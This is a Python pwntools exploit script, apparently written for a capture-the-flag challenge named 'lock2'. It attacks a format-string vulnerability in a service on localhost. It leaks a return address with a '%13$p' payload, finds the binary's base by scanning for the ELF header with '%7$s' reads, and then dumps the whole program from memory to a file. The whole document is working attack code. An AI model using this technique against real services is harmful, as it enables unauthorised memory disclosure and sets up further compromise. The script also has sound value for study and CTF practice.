#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep

io = remote("localhost", 9999)

def getBase(retAddr):
    textAddr = retAddr >> 12 << 12;
    success("textAddr -> {:#x}".format(textAddr))
    while True:
        io.sendlineafter("cmd:", "..%7$s..{}\0".format(p64(textAddr)))
        io.recvuntil("cmd:..")
        if io.recvn(4) == "\x7fELF":
            success("textBase -> {:#x}".format(textAddr))
            return textAddr
        textAddr -= 0x1000
        #  sleep(0.01)

def leak(addr):
    if "\n" in p64(addr):
        return '\0'

    io.sendlineafter("cmd:", "..%7$s..{}\0".format(p64(addr)))
    io.recvuntil("cmd:..")

    return io.recvuntil("..", drop = True)

def dumpBin(textBase):
    f = open("lock2.dump", "a")
    addr = textBase
    while True:
        try:
            content = leak(addr)
            #  sleep(0.01)
            if len(content):
                f.write(content)
                f.flush()
                #  info(hexdump(content))
                addr += len(content)
            else:
                f.write("\0")
                addr += 1

        except EOFError:
            success("dump finished!")
            f.close()
            io.close()
            break

if __name__ == "__main__":
    io.sendlineafter(":", "123456")
    io.sendlineafter("cmd:", "..%13$p..")
    io.recvuntil("..")
    retAddr = int(io.recvuntil("..", drop = True), 16)
    success("retAddr -> {:#x}".format(retAddr))

    textBase = getBase(retAddr)
    dumpBin(textBase)
